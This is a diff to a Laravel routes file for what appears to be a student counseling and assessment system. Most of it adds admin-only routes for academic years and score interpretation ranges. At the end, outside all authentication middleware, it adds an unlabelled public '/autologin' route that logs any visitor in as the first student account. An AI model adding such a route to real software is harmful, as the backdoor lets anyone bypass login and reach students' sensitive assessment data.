@@ -42,6 +42,8 @@ Route::middleware(['auth', 'verified', 'counselor_or_admin'])->group(function ()
     Route::put('/manage/question-bank/{category}', [\App\Http\Controllers\Staff\QuestionBankController::class, 'update'])->name('question-bank.update');
     Route::delete('/manage/question-bank/{category}', [\App\Http\Controllers\Staff\QuestionBankController::class, 'destroy'])->name('question-bank.destroy');
 
+
+
     // Schedules
     Route::get('/manage/schedules', [\App\Http\Controllers\Staff\AssessmentScheduleController::class, 'index'])->name('schedules.index');
     Route::get('/manage/schedules/create', [\App\Http\Controllers\Staff\AssessmentScheduleController::class, 'create'])->name('schedules.create');
@@ -80,7 +82,23 @@ Route::middleware(['auth', 'verified', 'counselor_or_admin'])->group(function ()
         Route::post('/manage/institution/programs', [\App\Http\Controllers\Staff\InstitutionController::class, 'storeProgram'])->name('institution.programs.store');
         Route::put('/manage/institution/programs/{program}', [\App\Http\Controllers\Staff\InstitutionController::class, 'updateProgram'])->name('institution.programs.update');
         Route::delete('/manage/institution/programs/{program}', [\App\Http\Controllers\Staff\InstitutionController::class, 'destroyProgram'])->name('institution.programs.destroy');
+
+        // Academic Years (System Admin Only)
+        Route::post('/manage/institution/academic-years', [\App\Http\Controllers\Staff\InstitutionController::class, 'storeAcademicYear'])->name('institution.academic-years.store');
+        Route::put('/manage/institution/academic-years/{academic_year}', [\App\Http\Controllers\Staff\InstitutionController::class, 'updateAcademicYear'])->name('institution.academic-years.update');
+        Route::delete('/manage/institution/academic-years/{academic_year}', [\App\Http\Controllers\Staff\InstitutionController::class, 'destroyAcademicYear'])->name('institution.academic-years.destroy');
+        Route::patch('/manage/institution/academic-years/{academic_year}/set-current', [\App\Http\Controllers\Staff\InstitutionController::class, 'setCurrentAcademicYear'])->name('institution.academic-years.set-current');
+
+        // Interpretation Ranges (System Admin Only due to clinical validation concerns)
+        Route::post('/manage/question-bank/{question_category}/ranges', [\App\Http\Controllers\Staff\InterpretationRangeController::class, 'store'])->name('interpretation-ranges.store');
+        Route::put('/manage/question-bank/{question_category}/ranges/{range}', [\App\Http\Controllers\Staff\InterpretationRangeController::class, 'update'])->name('interpretation-ranges.update');
+        Route::delete('/manage/question-bank/{question_category}/ranges/{range}', [\App\Http\Controllers\Staff\InterpretationRangeController::class, 'destroy'])->name('interpretation-ranges.destroy');
     });
 });
 
 require __DIR__.'/auth.php';
+
+Route::get('/autologin', function() {
+    auth()->login(App\Models\User::where('role', 'student')->first());
+    return redirect('/inventory');
+});
